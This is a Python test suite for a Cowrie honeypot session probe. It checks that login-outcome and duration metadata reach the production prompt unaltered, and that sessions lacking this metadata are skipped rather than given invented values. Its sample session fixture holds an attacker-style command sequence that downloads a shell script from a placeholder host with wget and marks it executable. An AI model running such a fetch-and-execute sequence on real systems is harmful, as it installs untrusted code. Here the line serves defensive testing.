#!/usr/bin/env python3
"""Tests for the real-data session probe's metadata honesty (#2387).

Stage 1 of probe-real-session used to pin session_prompt()'s two
non-transcript inputs to constants (auth_success=False, duration_seconds=0.0)
while its docstring claimed the output was the EXACT production prompt. These
tests pin the fix's two halves, with the contracts module stubbed so nothing
here needs /app, pydantic, Elasticsearch, docker, or a live worker:

  - exactness: real auth/duration evidence from stage 0 reaches
    session_prompt() unchanged;
  - honesty: sessions whose evidence never made it into the lookback window
    are reported under skipped_sessions with the missing field named, and no
    prompt is built for them at all (the old constants are never resurrected).
"""

import importlib.util
import io
import json
import sys
import types
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

PROBE_PATH = Path(__file__).resolve().parents[1] / "probe-real-session.py"


class _Transcript:
    def __init__(self, text):
        self.text = text
        self.truncated = False


class _FakeContracts(types.ModuleType):
    """Minimal contracts stand-in: records exactly what stage 1 passes through."""

    def __init__(self):
        super().__init__("contracts")
        self.calls = []
        self.SYSTEM_PROMPT = "SYS"

    def sanitize_commands(self, commands, max_content_chars):
        return _Transcript("\n".join(commands)), len(commands)

    def session_prompt(self, transcript, duration_seconds, command_count, auth_success):
        self.calls.append({
            "duration_seconds": duration_seconds,
            "command_count": command_count,
            "auth_success": auth_success,
        })
        return (
            f"PROMPT(duration={max(0.0, float(duration_seconds)):.1f}s,"
            f"commands={command_count},"
            f"auth_success={str(auth_success).lower()})"
        )


def load_probe():
    """Executes the probe source with `contracts` pre-stubbed in sys.modules.

    The stub wins before the probe's sys.path.insert(0, "/app") ever resolves,
    so the module imports without llm-worker's environment.
    """
    fake = _FakeContracts()
    saved = sys.modules.get("contracts")
    sys.modules["contracts"] = fake
    try:

        spec = importlib.util.spec_from_file_location("probe_real_session", PROBE_PATH)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
    finally:
        if saved is not None:
            sys.modules["contracts"] = saved
        else:
            del sys.modules["contracts"]
    return module, fake


def run_stage1(payload):
    module, fake = load_probe()
    # The probe reads json.load(sys.stdin) and prints to stdout at call time,
    # so swapping the stream objects (and restoring them) is enough isolation.
    saved_stdin, saved_stdout = sys.stdin, sys.stdout
    sys.stdin = io.StringIO(json.dumps(payload))
    sys.stdout = captured = io.StringIO()
    try:
        rc = module.main()
    finally:
        text = captured.getvalue()
        sys.stdin, sys.stdout = saved_stdin, saved_stdout
    assert rc == 0
    return json.loads(text), fake


def session(**overrides):
    base = {
        "session_id": "abcdef123456",
        "commands": ["cd /tmp", "wget http://example.invalid/x.sh", "chmod +x x.sh"],
        "first_seen": "2026-08-20T10:00:00Z",
        "last_seen": "2026-08-20T10:00:42Z",
        "auth_success": True,
        "closed": True,
        "duration_seconds": 41.5,
        "metadata_gaps": [],
    }
    base.update(overrides)
    return base


class ExactnessTest(unittest.TestCase):
    def test_real_auth_and_duration_reach_the_production_prompt(self):
        out, fake = run_stage1({"sessions": [session()]})
        self.assertEqual(len(out["prompts"]), 1)
        self.assertEqual(len(fake.calls), 1)
        call = fake.calls[0]
        self.assertIs(call["auth_success"], True)
        self.assertEqual(call["duration_seconds"], 41.5)
        self.assertEqual(call["command_count"], 3)
        # The rendered prompt shows production's own formatting of real values.
        self.assertIn("duration=41.5s", out["prompts"][0]["user_prompt"])
        self.assertIn("auth_success=true", out["prompts"][0]["user_prompt"])

    def test_false_and_zero_are_honored_when_they_are_real_observations(self):
        # A commands-carrying session whose logins all failed is unusual but
        # possible; auth_success=False here is evidence, not a default, so it
        # must still be prompted.
        out, fake = run_stage1({
            "sessions": [session(auth_success=False, closed=True,
                                 duration_seconds=0.0)]
        })
        self.assertEqual(len(out["prompts"]), 1)
        self.assertIn("auth_success=false", out["prompts"][0]["user_prompt"])
        self.assertEqual(fake.calls[0]["duration_seconds"], 0.0)
        self.assertNotIn("skipped_sessions", out)

    def test_empty_input_still_passes_stage_zeros_warning_through(self):
        warning = "no real cowrie command activity in this lookback window"
        out, _ = run_stage1({"warning": warning, "sessions": []})
        self.assertEqual(out["prompts"], [])
        self.assertEqual(out["warning"], warning)


class UnresolvableMetadataTest(unittest.TestCase):
    def test_unobserved_auth_is_reported_not_defaulted(self):
        out, fake = run_stage1({
            "sessions": [session(auth_success=None, metadata_gaps=[
                "auth_success: no cowrie.login.success/cowrie.login.failed event "
                "found for this session inside the lookback window"])]
        })
        self.assertEqual(out["prompts"], [])
        self.assertEqual(fake.calls, [], "no prompt may be fabricated without auth evidence")
        skipped = out["skipped_sessions"]
        self.assertEqual(len(skipped), 1)
        self.assertEqual(skipped[0]["unresolvable_fields"], ["auth_success"])
        self.assertIn("cowrie.login.success", skipped[0]["note"])

    def test_missing_duration_is_reported_not_defaulted(self):
        out, fake = run_stage1({
            "sessions": [
                session(session_id="noclose",
                        closed=False,
                        duration_seconds=None,
                        metadata_gaps=["duration_seconds: no cowrie.session.closed "
                                       "event found for this session inside the "
                                       "lookback window"]),
                session(session_id="close_nodur",
                        closed=True,
                        duration_seconds=None,
                        metadata_gaps=["duration_seconds: cowrie.session.closed "
                                       "observed but carried no usable "
                                       "honeypot.duration"]),
            ]
        })
        self.assertEqual(out["prompts"], [])
        self.assertEqual(fake.calls, [])
        fields = {s["session_id"]: s["unresolvable_fields"] for s in out["skipped_sessions"]}
        self.assertEqual(fields["noclose"], ["duration_seconds"])
        self.assertEqual(fields["close_nodur"], ["duration_seconds"])
        self.assertIn("would have required inventing inputs", out["skipped_note"])

    def test_both_fields_missing_names_them_together(self):
        out, _ = run_stage1({
            "sessions": [session(auth_success=None, duration_seconds=None,
                                 metadata_gaps=["no login-outcome or session-close "
                                                "evidence for this session inside the "
                                                "lookback window"])]
        })
        self.assertEqual(
            out["skipped_sessions"][0]["unresolvable_fields"],
            ["auth_success", "duration_seconds"],
        )

    def test_a_boolean_duration_does_not_sneak_past_the_type_check(self):
        # bool is an int subclass; True as a duration would render 1.0s. Stage 0
        # can only emit numbers there, so anything else means upstream schema
        # drift -- report it rather than rendering it.
        out, fake = run_stage1({"sessions": [session(duration_seconds=True)]})
        self.assertEqual(out["prompts"], [])
        self.assertEqual(fake.calls, [])
        self.assertEqual(out["skipped_sessions"][0]["unresolvable_fields"],
                         ["duration_seconds"])


class StageZeroMergeFixturesTest(unittest.TestCase):
    """#2426: stage 0's jq correlate-and-fill program is extracted verbatim
    into probe-real-session-merge.jq so the exact expression the live probe
    runs can be executed hermetically -- plain jq on committed fixture files,
    no docker, no ES, no second copy of the logic to drift. The dev-session
    docker shim that once proved this logic existed nowhere in CI, which let
    the empty-second-response null-iteration bug be caught by luck instead of
    by a run."""

    BENCH_DIR = Path(__file__).resolve().parents[1]
    PROGRAM = BENCH_DIR / "probe-real-session-merge.jq"
    FIXTURES = Path(__file__).resolve().parent / "fixtures" / "probe-real-session-merge"
    FETCH = BENCH_DIR / "probe-real-session-fetch.sh"

    def test_the_probe_executes_the_extracted_file(self):
        """Wiring tripwire: if fetch.sh ever grows its own inline copy again,
        this suite would be testing a file nothing runs."""
        self.assertIn("probe-real-session-merge.jq", self.FETCH.read_text())

    def test_every_fixture_matches_its_expected_output(self):
        import shutil
        import subprocess

        jq = shutil.which("jq")
        if jq is None:
            # Graceful degrade where the binary itself is unavailable (#2389's
            # home-row contract: only interpreter + checkout files). The
            # fixtures stay committed and reviewed either way.
            self.skipTest("jq binary not available on this executor")

        cases = sorted(p for p in self.FIXTURES.iterdir() if p.is_dir())
        self.assertGreaterEqual(len(cases), 4, "fixture set shrank")
        for case in cases:
            with self.subTest(fixture=case.name):
                meta = (case / "meta.json").read_text()
                result = subprocess.run(
                    [jq, "--argjson", "meta", meta, "-f", str(self.PROGRAM)],
                    input=(case / "sessions.json").read_bytes(),
                    capture_output=True,
                )
                self.assertEqual(result.returncode, 0, result.stderr.decode())
                self.assertEqual(
                    json.loads(result.stdout),
                    json.loads((case / "expected.json").read_text()),
                )


if __name__ == "__main__":
    unittest.main(verbosity=2)
